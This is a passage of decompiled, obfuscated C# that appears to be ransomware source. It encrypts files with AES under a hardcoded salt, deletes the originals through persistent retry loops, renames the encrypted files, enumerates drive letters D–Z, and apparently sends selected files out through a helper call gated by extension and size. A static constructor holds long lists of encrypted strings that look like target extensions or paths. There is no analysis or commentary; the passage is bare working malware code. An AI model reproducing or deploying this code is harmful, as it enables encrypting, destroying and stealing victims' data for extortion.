								MDGJMFjWgcsbCsl(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + FxgjJBeAgKI.getString_0(107386427), oybyixAEyQBUaM);
							}
							else
							{
								MDGJMFjWgcsbCsl(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + FxgjJBeAgKI.getString_0(107386427), Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!AcumuDDlRST)
								{
									chNSgfSgFKJs(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, oybyixAEyQBUaM, Convert.FromBase64String(MLaZeafODt));
								}
								else
								{
									chNSgfSgFKJs(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex14)
							{
								if (VLajbDNhoSbf)
								{
									try
									{
										File.AppendAllText(MGkBzYPheHDPb, FxgjJBeAgKI.getString_0(107386181) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + FxgjJBeAgKI.getString_0(107386386) + ex14.Message + FxgjJBeAgKI.getString_0(107396343));
									}
									catch (Exception)
									{
									}
								}
								uAQgXZmBeIANml++;
								return;
							}
						}
						if (AcumuDDlRST)
						{
							if (CS_0024_003C_003E8__locals0.utySFCfMcfJj != FxgjJBeAgKI.getString_0(107386432))
							{
								hOfBAzalVlDAWcj(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj, bytes2);
							}
							else
							{
								hOfBAzalVlDAWcj(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0b2a;
			IL_0b2a:
			CS_0024_003C_003E8__locals0.UWBePPalaohE.Remove(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
		});
	}

	private static void pLkiXxNFkNkOqT(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (SFDpinVUmMSqKHuE == getString_0(107396853))
					{
						foreach (string item in sAdxWTwIriShHsff)
						{
							if (string_0.ToLower().EndsWith(item) && YzEXDgkVctSKX == getString_0(107396853))
							{
								if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										ZAUYlWQzUcjJsT.miCKLJJWpcWV(getString_0(107389182), getString_0(107389177), getString_0(107389196), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && YzEXDgkVctSKX == getString_0(107397110))
							{
								try
								{
									ZAUYlWQzUcjJsT.miCKLJJWpcWV(getString_0(107389182), getString_0(107389177), getString_0(107389196), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107386408)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107386408), getString_0(107389133)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void chNSgfSgFKJs(string MGCCTQWlFnh, string XCVpcdqWMRGx, byte[] meDiusSpVwOD, byte[] mDOstkZferzzSP = null)
	{
		try
		{
			if (SFDpinVUmMSqKHuE == getString_0(107396853))
			{
				FileStream fileStream = new FileStream(MGCCTQWlFnh, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in sAdxWTwIriShHsff)
				{
					if (MGCCTQWlFnh.ToLower().EndsWith(item) && YzEXDgkVctSKX == getString_0(107396853))
					{
						if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								ZAUYlWQzUcjJsT.miCKLJJWpcWV(getString_0(107389182), getString_0(107389177), getString_0(107389196), MGCCTQWlFnh);
							}
							catch
							{
							}
						}
					}
					else if (MGCCTQWlFnh.ToLower().EndsWith(item) && YzEXDgkVctSKX == getString_0(107397110))
					{
						try
						{
							ZAUYlWQzUcjJsT.miCKLJJWpcWV(getString_0(107389182), getString_0(107389177), getString_0(107389196), MGCCTQWlFnh);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (MGCCTQWlFnh != XCVpcdqWMRGx)
		{
			File.Move(MGCCTQWlFnh, XCVpcdqWMRGx);
			MGCCTQWlFnh = XCVpcdqWMRGx;
		}
		byte[] bytes = GYrgigmSJl.YnZehuQLJizp(File.ReadAllBytes(MGCCTQWlFnh), meDiusSpVwOD, mDOstkZferzzSP);
		File.WriteAllBytes(MGCCTQWlFnh, bytes);
		ywaYFjHsMFpWdbL++;
	}

	private static void MDGJMFjWgcsbCsl(string string_0, string string_1, byte[] byte_0)
	{
		VYqCPtfxuGjAcnc CS_0024_003C_003E8__locals0 = new VYqCPtfxuGjAcnc();
		CS_0024_003C_003E8__locals0.eltoobQHQxyj = string_0;
		CS_0024_003C_003E8__locals0.sIPOkqlVRtqKbWj = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string sIPOkqlVRtqKbWj = CS_0024_003C_003E8__locals0.sIPOkqlVRtqKbWj;
			FileStream fileStream = new FileStream(sIPOkqlVRtqKbWj, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (FTilkCJiPZSoYC == getString_0(107396853))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.eltoobQHQxyj, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.eltoobQHQxyj, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.eltoobQHQxyj, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.sIPOkqlVRtqKbWj.Length > 0)
				{
					if (SFDpinVUmMSqKHuE == getString_0(107396853))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.eltoobQHQxyj, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in sAdxWTwIriShHsff)
						{
							if (CS_0024_003C_003E8__locals0.eltoobQHQxyj.ToLower().EndsWith(item) && YzEXDgkVctSKX == getString_0(107396853))
							{
								if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										ZAUYlWQzUcjJsT.miCKLJJWpcWV(getString_0(107389182), getString_0(107389177), getString_0(107389196), CS_0024_003C_003E8__locals0.eltoobQHQxyj);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.eltoobQHQxyj.ToLower().EndsWith(item) && YzEXDgkVctSKX == getString_0(107397110))
							{
								try
								{
									ZAUYlWQzUcjJsT.miCKLJJWpcWV(getString_0(107389182), getString_0(107389177), getString_0(107389196), CS_0024_003C_003E8__locals0.eltoobQHQxyj);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.eltoobQHQxyj);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.sIPOkqlVRtqKbWj.EndsWith(getString_0(107386408)))
					{
						File.Move(CS_0024_003C_003E8__locals0.sIPOkqlVRtqKbWj, CS_0024_003C_003E8__locals0.sIPOkqlVRtqKbWj.Replace(getString_0(107386408), getString_0(107389133)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.sIPOkqlVRtqKbWj))
							{
								File.Delete(CS_0024_003C_003E8__locals0.sIPOkqlVRtqKbWj);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (VLajbDNhoSbf)
			{
				try
				{
					File.AppendAllText(MGkBzYPheHDPb, getString_0(107386162) + CS_0024_003C_003E8__locals0.eltoobQHQxyj + getString_0(107386367) + ex2.Message + getString_0(107396324));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> source = fKSEXFuwhxqo;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
			{
				ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107386346)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		List<string> source2 = sCGElgUFAvuF;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107386301)), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		if (ZKhoLenETDJl == getString_0(107396853))
		{
			string[] mWvvpEiADk = MWvvpEiADk;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107386301)), getString_0(107386308) + string_0 + getString_0(107386267));
				};
			}
			Parallel.ForEach(mWvvpEiADk, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		if (!fSJKiQHscLg().Contains(getString_0(107386028)))
		{
			MquKelznTSTt(ShXoyCWZDyXwi);
		}
		else
		{
			List<string> source3 = xeIMBaJAxSsDB;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					ZMMcdzUOldsoj(wcGmwtolXpKf(AeqRpGGGnSrlvi(getString_0(107386262))), string_0);
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		List<string> efmWSoVDSebqevqR = EfmWSoVDSebqevqR;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107386237)), string_0);
			};
		}
		Parallel.ForEach(efmWSoVDSebqevqR, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107386346)), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107386301)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107386301)), getString_0(107386308) + string_0 + getString_0(107386267));
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		ZMMcdzUOldsoj(wcGmwtolXpKf(AeqRpGGGnSrlvi(getString_0(107386262))), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107386237)), string_0);
	}

	private static void _003CMapDrv_003Eb__17(string string_0)
	{
		nIgmNIXelPinh CS_0024_003C_003E8__locals0 = new nIgmNIXelPinh();
		CS_0024_003C_003E8__locals0.LpqzqekLavlGf = string_0;
		if ((!CS_0024_003C_003E8__locals0.LpqzqekLavlGf.StartsWith(getString_0(107386252)) && !CS_0024_003C_003E8__locals0.LpqzqekLavlGf.StartsWith(getString_0(107386247)) && !CS_0024_003C_003E8__locals0.LpqzqekLavlGf.StartsWith(getString_0(107385694)) && !CS_0024_003C_003E8__locals0.LpqzqekLavlGf.StartsWith(getString_0(107389133))) || !YvpiSoEdxRAzW.VuaFZudDlmje(CS_0024_003C_003E8__locals0.LpqzqekLavlGf))
		{
			return;
		}
		try
		{
			Thread.Sleep(rqDMxhDDSWkTsJ);
			jwBOsivrxmQ.Add(getString_0(107388130) + CS_0024_003C_003E8__locals0.LpqzqekLavlGf + getString_0(107385713));
			try
			{
				if (RiGciHwEXLcD)
				{
					Console.WriteLine(getString_0(107388130) + CS_0024_003C_003E8__locals0.LpqzqekLavlGf + getString_0(107385713));
				}
			}
			catch
			{
			}
			Parallel.For(68, 91, delegate(int int_0)
			{
				Thread.Sleep(rqDMxhDDSWkTsJ);
				jwBOsivrxmQ.Add(nIgmNIXelPinh.getString_0(107388136) + CS_0024_003C_003E8__locals0.LpqzqekLavlGf + nIgmNIXelPinh.getString_0(107396781) + (char)int_0 + nIgmNIXelPinh.getString_0(107403681));
				try
				{
					if (RiGciHwEXLcD)
					{
						Console.WriteLine(nIgmNIXelPinh.getString_0(107388136) + CS_0024_003C_003E8__locals0.LpqzqekLavlGf + nIgmNIXelPinh.getString_0(107396781) + (char)int_0 + nIgmNIXelPinh.getString_0(107403681));
					}
				}
				catch
				{
				}
			});
		}
		catch
		{
		}
	}

	static CRZFkRWzfSXjW()
	{
		Strings.CreateGetStringDelegate(typeof(CRZFkRWzfSXjW));
		wUDkdnCGLMOs = getString_0(107389544);
		oybyixAEyQBUaM = null;
		VIsIdhZRykLqTUQDB = getString_0(107397110);
		xtbYgrRCEXRhIt = getString_0(107385704);
		jwBOsivrxmQ = new List<string>();
		rpxCtxXAXaqO = new List<string>();
		sfTwxMnKqH = getString_0(107397110);
		pPYjMJSGlCKrKN = getString_0(107389133);
		MLaZeafODt = getString_0(107389133);
		OXVbUzKTVitWIr = getString_0(107389133);
		tXzockTHFc = getString_0(107397110);
		HBRweUbQOIMdbZZp = 0;
		hbiMFBxXkVIgur = getString_0(107397110);
		joSdEOhiuznF = getString_0(107397110);
		PqJDLaSNaTyq = getString_0(107397110);
		qPJcttYtoGQxk = getString_0(107385659);
		pHrGJqOZIctkX = getString_0(107397110);
		odoeVPlCXvoFQPOL = getString_0(107397110);
		PaFnRkZFdGu = getString_0(107397110);
		KHZEvaaAjnAHLm = getString_0(107397110);
		tAtyTsIAxbjQvxo = new List<string>
		{
			wcGmwtolXpKf(getString_0(107385654)),
			wcGmwtolXpKf(getString_0(107385669)),
			wcGmwtolXpKf(getString_0(107385644)),
			wcGmwtolXpKf(getString_0(107385595)),
			wcGmwtolXpKf(getString_0(107385570)),
			wcGmwtolXpKf(getString_0(107385577)),
			wcGmwtolXpKf(getString_0(107385528)),
			wcGmwtolXpKf(getString_0(107385503)),
			wcGmwtolXpKf(getString_0(107385510)),
			wcGmwtolXpKf(getString_0(107385485)),
			wcGmwtolXpKf(getString_0(107385948)),
			wcGmwtolXpKf(getString_0(107385955)),
			wcGmwtolXpKf(getString_0(107385930))
		};
		CyfMkozTWVl = new List<string>();
		XndNHYXWpvB = getString_0(107397110);
		uLLsUdDbXoEVQ = getString_0(107397110);
		FCVCIbLfbkOUFF = getString_0(107397110);
		ngVLNnblfHHw = new List<string>();
		MvoNMddyflMC = getString_0(107397110);
		mNEuIvkieOf = getString_0(107385905);
		PEOsufOVorqNP = getString_0(107396853);
		BdLuVqHofum = getString_0(107397110);
		malBhCqwsAb = new List<string>
		{
			wcGmwtolXpKf(getString_0(107385824)),
			wcGmwtolXpKf(getString_0(107385791)),
			wcGmwtolXpKf(getString_0(107385758)),
			wcGmwtolXpKf(getString_0(107385725)),
			wcGmwtolXpKf(getString_0(107385180)),
			wcGmwtolXpKf(getString_0(107385151)),
			wcGmwtolXpKf(getString_0(107385126)),
			wcGmwtolXpKf(getString_0(107385097)),
			wcGmwtolXpKf(getString_0(107385020)),
			wcGmwtolXpKf(getString_0(107384955)),
			wcGmwtolXpKf(getString_0(107385434)),
			wcGmwtolXpKf(getString_0(107385401)),
			wcGmwtolXpKf(getString_0(107385368)),
			wcGmwtolXpKf(getString_0(107385339)),
			wcGmwtolXpKf(getString_0(107385310)),
			wcGmwtolXpKf(getString_0(107385269)),
			wcGmwtolXpKf(getString_0(107385260)),
			wcGmwtolXpKf(getString_0(107384659)),
			wcGmwtolXpKf(getString_0(107384610)),
			wcGmwtolXpKf(getString_0(107384577)),
			wcGmwtolXpKf(getString_0(107384580)),
			wcGmwtolXpKf(getString_0(107384507)),
			wcGmwtolXpKf(getString_0(107384498)),
			wcGmwtolXpKf(getString_0(107384465)),
			wcGmwtolXpKf(getString_0(107384896)),
			wcGmwtolXpKf(getString_0(107384871)),
			wcGmwtolXpKf(getString_0(107384798)),
			wcGmwtolXpKf(getString_0(107384769)),
			wcGmwtolXpKf(getString_0(107384728)),
			wcGmwtolXpKf(getString_0(107384159)),
			wcGmwtolXpKf(getString_0(107384094)),
			wcGmwtolXpKf(getString_0(107384069)),
			wcGmwtolXpKf(getString_0(107384004)),
			wcGmwtolXpKf(getString_0(107383923)),
			wcGmwtolXpKf(getString_0(107384402)),
			wcGmwtolXpKf(getString_0(107384313)),
			wcGmwtolXpKf(getString_0(107384280)),
			wcGmwtolXpKf(getString_0(107384271)),
			wcGmwtolXpKf(getString_0(107384230)),
			wcGmwtolXpKf(getString_0(107383641)),
			wcGmwtolXpKf(getString_0(107383612)),
			wcGmwtolXpKf(getString_0(107383547)),
			wcGmwtolXpKf(getString_0(107383538)),
			wcGmwtolXpKf(getString_0(107383505)),
			wcGmwtolXpKf(getString_0(107383464)),
			wcGmwtolXpKf(getString_0(107383895)),
			wcGmwtolXpKf(getString_0(107383882)),
			wcGmwtolXpKf(getString_0(107383777)),
			wcGmwtolXpKf(getString_0(107383732)),
			wcGmwtolXpKf(getString_0(107383719)),
			wcGmwtolXpKf(getString_0(107383130)),
			wcGmwtolXpKf(getString_0(107383121)),
			wcGmwtolXpKf(getString_0(107383048)),
			wcGmwtolXpKf(getString_0(107383019)),
			wcGmwtolXpKf(getString_0(107382946)),
			wcGmwtolXpKf(getString_0(107383393)),
			wcGmwtolXpKf(getString_0(107383348)),
			wcGmwtolXpKf(getString_0(107383319)),
			wcGmwtolXpKf(getString_0(107383306)),
			wcGmwtolXpKf(getString_0(107383241)),
			wcGmwtolXpKf(getString_0(107383212)),
			wcGmwtolXpKf(getString_0(107382611)),
			wcGmwtolXpKf(getString_0(107382578)),
			wcGmwtolXpKf(getString_0(107382537)),
			wcGmwtolXpKf(getString_0(107382508)),
			wcGmwtolXpKf(getString_0(107382467)),
			wcGmwtolXpKf(getString_0(107382898)),
			wcGmwtolXpKf(getString_0(107382805)),
			wcGmwtolXpKf(getString_0(107382764)),
			wcGmwtolXpKf(getString_0(107382687)),
			wcGmwtolXpKf(getString_0(107382654)),
			wcGmwtolXpKf(getString_0(107382101)),
			wcGmwtolXpKf(getString_0(107382056)),
			wcGmwtolXpKf(getString_0(107381979)),
			wcGmwtolXpKf(getString_0(107381890)),
			wcGmwtolXpKf(getString_0(107382385)),
			wcGmwtolXpKf(getString_0(107382324)),
			wcGmwtolXpKf(getString_0(107382315)),
			wcGmwtolXpKf(getString_0(107382250)),
			wcGmwtolXpKf(getString_0(107382169)),
			wcGmwtolXpKf(getString_0(107381600)),
			wcGmwtolXpKf(getString_0(107381567)),
			wcGmwtolXpKf(getString_0(107381506)),
			wcGmwtolXpKf(getString_0(107381481)),
			wcGmwtolXpKf(getString_0(107384313)),
			wcGmwtolXpKf(getString_0(107381424)),
			wcGmwtolXpKf(getString_0(107381383)),
			wcGmwtolXpKf(getString_0(107381806)),
			wcGmwtolXpKf(getString_0(107381729)),
			wcGmwtolXpKf(getString_0(107381700)),
			wcGmwtolXpKf(getString_0(107381675)),
			wcGmwtolXpKf(getString_0(107381086)),
			wcGmwtolXpKf(getString_0(107381069)),
			wcGmwtolXpKf(getString_0(107384159)),
			wcGmwtolXpKf(getString_0(107381004)),
			wcGmwtolXpKf(getString_0(107380963)),
			wcGmwtolXpKf(getString_0(107380906)),
			wcGmwtolXpKf(getString_0(107384094)),
			wcGmwtolXpKf(getString_0(107381313)),
			wcGmwtolXpKf(getString_0(107381296)),
			wcGmwtolXpKf(getString_0(107381175)),
			wcGmwtolXpKf(getString_0(107381110)),
			wcGmwtolXpKf(getString_0(107413349)),
			wcGmwtolXpKf(getString_0(107384004)),
			wcGmwtolXpKf(getString_0(107413240)),
			wcGmwtolXpKf(getString_0(107384280)),
			wcGmwtolXpKf(getString_0(107383923)),
			wcGmwtolXpKf(getString_0(107413207)),
			wcGmwtolXpKf(getString_0(107413150)),
			wcGmwtolXpKf(getString_0(107384402)),
			wcGmwtolXpKf(getString_0(107413117)),
			wcGmwtolXpKf(getString_0(107413612)),
			wcGmwtolXpKf(getString_0(107413531)),
			wcGmwtolXpKf(getString_0(107384728)),
			wcGmwtolXpKf(getString_0(107413506)),
			wcGmwtolXpKf(getString_0(107413461)),
			wcGmwtolXpKf(getString_0(107413432)),
			wcGmwtolXpKf(getString_0(107413403)),
			wcGmwtolXpKf(getString_0(107413390)),
			wcGmwtolXpKf(getString_0(107412845)),
			wcGmwtolXpKf(getString_0(107412788)),
			wcGmwtolXpKf(getString_0(107412775)),
			wcGmwtolXpKf(getString_0(107412750)),
			wcGmwtolXpKf(getString_0(107412709)),
			wcGmwtolXpKf(getString_0(107412632)),
			wcGmwtolXpKf(getString_0(107412615)),
			wcGmwtolXpKf(getString_0(107413070)),
			wcGmwtolXpKf(getString_0(107413037)),
			wcGmwtolXpKf(getString_0(107412960)),
			wcGmwtolXpKf(getString_0(107412927)),
			wcGmwtolXpKf(getString_0(107412886)),
			wcGmwtolXpKf(getString_0(107384769)),
			wcGmwtolXpKf(getString_0(107412615)),
			wcGmwtolXpKf(getString_0(107412877)),
			wcGmwtolXpKf(getString_0(107412336)),
			wcGmwtolXpKf(getString_0(107412275)),
			wcGmwtolXpKf(getString_0(107412226)),
			wcGmwtolXpKf(getString_0(107412185)),
			wcGmwtolXpKf(getString_0(107412124)),
			wcGmwtolXpKf(getString_0(107412563)),
			wcGmwtolXpKf(getString_0(107412534)),
			wcGmwtolXpKf(getString_0(107412501)),
			wcGmwtolXpKf(getString_0(107412460)),
			wcGmwtolXpKf(getString_0(107412431)),
			wcGmwtolXpKf(getString_0(107412354)),
			wcGmwtolXpKf(getString_0(107411777)),
			wcGmwtolXpKf(getString_0(107411744)),
			wcGmwtolXpKf(getString_0(107411699)),
			wcGmwtolXpKf(getString_0(107411638)),
			wcGmwtolXpKf(getString_0(107411605)),
			wcGmwtolXpKf(getString_0(107411592)),
			wcGmwtolXpKf(getString_0(107412039)),
			wcGmwtolXpKf(getString_0(107412006)),
			wcGmwtolXpKf(getString_0(107411933)),
			wcGmwtolXpKf(getString_0(107411916)),
			wcGmwtolXpKf(getString_0(107384896)),
			wcGmwtolXpKf(getString_0(107411887)),
			wcGmwtolXpKf(getString_0(107411286)),
			wcGmwtolXpKf(getString_0(107411277)),
			wcGmwtolXpKf(getString_0(107411200)),
			wcGmwtolXpKf(getString_0(107411159)),
			wcGmwtolXpKf(getString_0(107411146)),
			wcGmwtolXpKf(getString_0(107411085)),
			wcGmwtolXpKf(getString_0(107411516)),
			wcGmwtolXpKf(getString_0(107411499)),
			wcGmwtolXpKf(getString_0(107411442)),
			wcGmwtolXpKf(getString_0(107411353)),
			wcGmwtolXpKf(getString_0(107411340)),
			wcGmwtolXpKf(getString_0(107410787)),
			wcGmwtolXpKf(getString_0(107410730)),
			wcGmwtolXpKf(getString_0(107384871)),
			wcGmwtolXpKf(getString_0(107410625)),
			wcGmwtolXpKf(getString_0(107410628)),
			wcGmwtolXpKf(getString_0(107410595)),
			wcGmwtolXpKf(getString_0(107411034)),
			wcGmwtolXpKf(getString_0(107411005)),
			wcGmwtolXpKf(getString_0(107384465)),
			wcGmwtolXpKf(getString_0(107410964)),
			wcGmwtolXpKf(getString_0(107410947)),
			wcGmwtolXpKf(getString_0(107410918)),
			wcGmwtolXpKf(getString_0(107383212)),
			wcGmwtolXpKf(getString_0(107410885)),
			wcGmwtolXpKf(getString_0(107410918)),
			wcGmwtolXpKf(getString_0(107410856)),
			wcGmwtolXpKf(getString_0(107410827)),
			wcGmwtolXpKf(getString_0(107410286)),
			wcGmwtolXpKf(getString_0(107410205)),
			wcGmwtolXpKf(getString_0(107410188)),
			wcGmwtolXpKf(getString_0(107410147)),
			wcGmwtolXpKf(getString_0(107410086)),
			wcGmwtolXpKf(getString_0(107410057)),
			wcGmwtolXpKf(getString_0(107410496)),
			wcGmwtolXpKf(getString_0(107410451)),
			wcGmwtolXpKf(getString_0(107410438)),
			wcGmwtolXpKf(getString_0(107410405)),
			wcGmwtolXpKf(getString_0(107410348)),
			wcGmwtolXpKf(getString_0(107409759)),
			wcGmwtolXpKf(getString_0(107409734)),
			wcGmwtolXpKf(getString_0(107409701)),
			wcGmwtolXpKf(getString_0(107409628)),
			wcGmwtolXpKf(getString_0(107409599)),
			wcGmwtolXpKf(getString_0(107409538)),
			wcGmwtolXpKf(getString_0(107410017)),
			wcGmwtolXpKf(getString_0(107409992)),
			wcGmwtolXpKf(getString_0(107409919)),
			wcGmwtolXpKf(getString_0(107409902)),
			wcGmwtolXpKf(getString_0(107409869)),
			wcGmwtolXpKf(getString_0(107409788)),
			wcGmwtolXpKf(getString_0(107409263)),
			wcGmwtolXpKf(getString_0(107409182)),
			wcGmwtolXpKf(getString_0(107409169)),
			wcGmwtolXpKf(getString_0(107409088)),
			wcGmwtolXpKf(getString_0(107409055)),
			wcGmwtolXpKf(getString_0(107409014)),
			wcGmwtolXpKf(getString_0(107409517)),
			wcGmwtolXpKf(getString_0(107409440)),
			wcGmwtolXpKf(getString_0(107412185)),
			wcGmwtolXpKf(getString_0(107409407)),
			wcGmwtolXpKf(getString_0(107409366)),
			wcGmwtolXpKf(getString_0(107409309)),
			wcGmwtolXpKf(getString_0(107409280)),
			wcGmwtolXpKf(getString_0(107408735)),
			wcGmwtolXpKf(getString_0(107408702)),
			wcGmwtolXpKf(getString_0(107408685)),
			wcGmwtolXpKf(getString_0(107408656)),
			wcGmwtolXpKf(getString_0(107408611)),
			wcGmwtolXpKf(getString_0(107408534)),
			wcGmwtolXpKf(getString_0(107408525)),
			wcGmwtolXpKf(getString_0(107408948)),
			wcGmwtolXpKf(getString_0(107408931)),
			wcGmwtolXpKf(getString_0(107408902)),
			wcGmwtolXpKf(getString_0(107408825))
		};
		fKSEXFuwhxqo = new List<string>
		{
			wcGmwtolXpKf(getString_0(107408816)),
			wcGmwtolXpKf(getString_0(107408223)),
			wcGmwtolXpKf(getString_0(107408206)),
			wcGmwtolXpKf(getString_0(107408125)),
